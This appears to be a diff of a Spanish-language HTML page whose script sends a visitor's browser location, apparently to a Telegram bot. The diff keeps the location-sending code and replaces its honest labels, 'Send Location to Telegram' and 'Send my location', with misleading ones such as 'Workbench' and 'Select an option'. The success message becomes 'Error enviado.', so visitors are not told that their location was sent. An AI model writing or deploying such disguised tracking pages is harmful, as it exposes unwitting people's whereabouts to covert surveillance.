@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enviar Ubicación a Telegram</title>
+    <title>Mesa de trabajo</title>
 </head>
 <body>
-    <h2>Compartir Ubicación</h2>
-    <button onclick="obtenerUbicacion()">Enviar mi ubicación</button>
+    <h2>Plantilla de autocopiado</h2>
+    <button onclick="obtenerUbicacion()">Selecciona una opcion</button>
 
     <script>
         function obtenerUbicacion() {
@@ -32,9 +32,9 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("Ubicación enviada con éxito.");
+                        alert("Error enviado.");
                     } else {
-                        alert("Error al enviar la ubicación.");
+                        alert("Error.");
                     }
                 })
                 .catch(error => {
@@ -44,7 +44,7 @@
         }
 
         function errorUbicacion(error) {
-            alert("Error al obtener la ubicación: " + error.message);
+            alert("Error" + error.message);
         }
     </script>
 </body>
